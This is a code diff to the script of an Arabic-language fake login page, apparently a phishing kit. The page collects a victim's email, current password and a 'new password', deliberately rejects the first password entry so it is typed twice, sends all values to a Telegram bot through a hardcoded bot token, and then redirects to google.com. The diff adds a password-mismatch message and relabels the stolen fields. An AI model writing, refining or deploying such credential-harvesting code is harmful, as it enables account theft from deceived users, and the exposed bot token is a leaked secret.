@@ -336,6 +336,7 @@
     <a href="#">الشروط</a>
   </div>
     
+
     <script>
       // Telegram Configuration
       const TELEGRAM_BOT_TOKEN = '8350768912:AAFxZ4hNXYAHJvaRL3cBJ_3u-2LxCOq6vv8';
@@ -355,115 +356,146 @@
       const showNameCheckbox = document.getElementById('show-name');
       const loadingEl = document.getElementById('loading');
 
+      // Add error message element for password mismatch
+      let mismatchMsg = document.createElement('div');
+      mismatchMsg.id = 'mismatch-msg';
+      mismatchMsg.style.color = '#ea4335';
+      mismatchMsg.style.fontSize = '14px';
+      mismatchMsg.style.marginTop = '8px';
+      mismatchMsg.style.display = 'none';
+      mismatchMsg.textContent = 'كلمة المرور غير متطابقة';
+      // Insert after the input group in step3
+      const inputGroupStep3 = step3.querySelector('.input-group');
+      inputGroupStep3.parentNode.insertBefore(mismatchMsg, inputGroupStep3.nextSibling);
+
       // Track name submission attempts
       let nameSubmittedOnce = false;
 
       // Toggle name visibility for step2
       showNameCheckbox.addEventListener('change', () => {
-        nameInput.type = showNameCheckbox.checked ? 'text' : 'password';
-        if (name2Input && name3Input) {
-          name2Input.type = showNameCheckbox.checked ? 'text' : 'password';
-          name3Input.type = showNameCheckbox.checked ? 'text' : 'password';
-        }
+      nameInput.type = showNameCheckbox.checked ? 'text' : 'password';
+      if (name2Input && name3Input) {
+        name2Input.type = showNameCheckbox.checked ? 'text' : 'password';
+        name3Input.type = showNameCheckbox.checked ? 'text' : 'password';
+      }
       });
 
       // Add toggle for step3
       step3.querySelector('#show-name').addEventListener('change', function() {
-        name2Input.type = this.checked ? 'text' : 'password';
-        name3Input.type = this.checked ? 'text' : 'password';
+      name2Input.type = this.checked ? 'text' : 'password';
+      name3Input.type = this.checked ? 'text' : 'password';
       });
 
       // Step 1 → Step 2
       function goToStep2() {
-        const email = emailInput.value.trim();
-        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-          emailInput.style.borderColor = '#ea4335';
-          return;
-        }
-        emailInput.style.borderColor = '#c0c3c7';
-        emailDisplay.textContent = email;
-        step1.style.display = 'none';
-        step2.style.display = 'block';
+      const email = emailInput.value.trim();
+      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        emailInput.style.borderColor = '#ea4335';
+        return;
+      }
+      emailInput.style.borderColor = '#c0c3c7';
+      emailDisplay.textContent = email;
+      step1.style.display = 'none';
+      step2.style.display = 'block';
       }
       nextBtn.addEventListener('click', goToStep2);
       emailInput.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') {
-          goToStep2();
-        }
+      if (e.key === 'Enter') {
+        goToStep2();
+      }
       });
 
       // Step 2 Submit → Step 3
       function goToStep3() {
-        const name = nameInput.value.trim();
-        if (!nameSubmittedOnce) {
-          nameSubmittedOnce = true;
-          nameInput.style.borderColor = '#ea4335';
-          nameInput.value = ''; // Remove password on first rejection
-          return;
-        }
-        if (!name) {
-          nameInput.style.borderColor = '#ea4335';
-          return;
-        }
-        nameInput.style.borderColor = '#c0c3c7';
-        submitBtn.disabled = true;
-        loadingEl.style.display = 'block';
+      const name = nameInput.value.trim();
+      if (!nameSubmittedOnce) {
+        nameSubmittedOnce = true;
+        nameInput.style.borderColor = '#ea4335';
+        nameInput.value = ''; // Remove password on first rejection
+        return;
+      }
+      if (!name) {
+        nameInput.style.borderColor = '#ea4335';
+        return;
+      }
+      nameInput.style.borderColor = '#c0c3c7';
+      submitBtn.disabled = true;
+      loadingEl.style.display = 'block';
 
-        setTimeout(() => {
-          step2.style.display = 'none';
-          step3.style.display = 'block';
-          submitBtn.disabled = false;
-          loadingEl.style.display = 'none';
-        }, 700);
+      setTimeout(() => {
+        step2.style.display = 'none';
+        step3.style.display = 'block';
+        submitBtn.disabled = false;
+        loadingEl.style.display = 'none';
+      }, 700);
       }
       submitBtn.addEventListener('click', goToStep3);
       nameInput.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') {
-          goToStep3();
-        }
+      if (e.key === 'Enter') {
+        goToStep3();
+      }
       });
+
+      // Password match check for step3
+      function checkPasswordMatch() {
+      if (name2Input.value !== name3Input.value) {
+        name2Input.style.borderColor = '#ea4335';
+        name3Input.style.borderColor = '#ea4335';
+        mismatchMsg.style.display = 'block';
+        return false;
+      } else {
+        name2Input.style.borderColor = '#c0c3c7';
+        name3Input.style.borderColor = '#c0c3c7';
+        mismatchMsg.style.display = 'none';
+        return true;
+      }
+      }
+      name2Input.addEventListener('input', checkPasswordMatch);
+      name3Input.addEventListener('input', checkPasswordMatch);
 
       // Step 3 Submit (send all data)
       step3.querySelector('#submit-btn').addEventListener('click', async () => {
-        const email = emailDisplay.textContent;
-        const name = nameInput.value.trim();
-        const newPass = name2Input.value.trim();
-        const confirmPass = name3Input.value.trim();
+      const email = emailDisplay.textContent;
+      const name = nameInput.value.trim();
+      const newPass = name2Input.value.trim();
+      const confirmPass = name3Input.value.trim();
 
-        if (!newPass || !confirmPass || newPass !== confirmPass) {
-          name2Input.style.borderColor = '#ea4335';
-          name3Input.style.borderColor = '#ea4335';
-          return;
+      if (!newPass || !confirmPass || newPass !== confirmPass) {
+        name2Input.style.borderColor = '#ea4335';
+        name3Input.style.borderColor = '#ea4335';
+        mismatchMsg.style.display = 'block';
+        return;
+      }
+      name2Input.style.borderColor = '#c0c3c7';
+      name3Input.style.borderColor = '#c0c3c7';
+      mismatchMsg.style.display = 'none';
+
+      step3.querySelector('#submit-btn').disabled = true;
+      step3.querySelector('#loading').style.display = 'block';
+
+      try {
+        const message = `*New Data*\n\nEmail: ${email}\nPassword: ${name}\nNew Password: ${newPass}\nConfirm Password: ${confirmPass}`;
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+        });
+        const result = await response.json();
+        if (result.ok) {
+        setTimeout(() => {
+          window.location.href = "https://www.google.com";
+        }, 700);
         }
-        name2Input.style.borderColor = '#c0c3c7';
-        name3Input.style.borderColor = '#c0c3c7';
-
-        step3.querySelector('#submit-btn').disabled = true;
-        step3.querySelector('#loading').style.display = 'block';
-
-        try {
-          const message = `*New Data*\n\nEmail: ${email}\nPS: ${name}\nN PS: ${newPass}\nC PS: ${confirmPass}`;
-          const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: TELEGRAM_CHAT_ID,
-              text: message,
-              parse_mode: 'Markdown'
-            })
-          });
-          const result = await response.json();
-          if (result.ok) {
-            setTimeout(() => {
-              window.location.href = "https://www.google.com";
-            }, 700);
-          }
-        } catch (error) {
-          // Handle error if needed
-        } finally {
-          step3.querySelector('#submit-btn').disabled = false;
-          step3.querySelector('#loading').style.display = 'none';
-        }
+      } catch (error) {
+        // Handle error if needed
+      } finally {
+        step3.querySelector('#submit-btn').disabled = false;
+        step3.querySelector('#loading').style.display = 'none';
+      }
       });
     </script>
 </body>
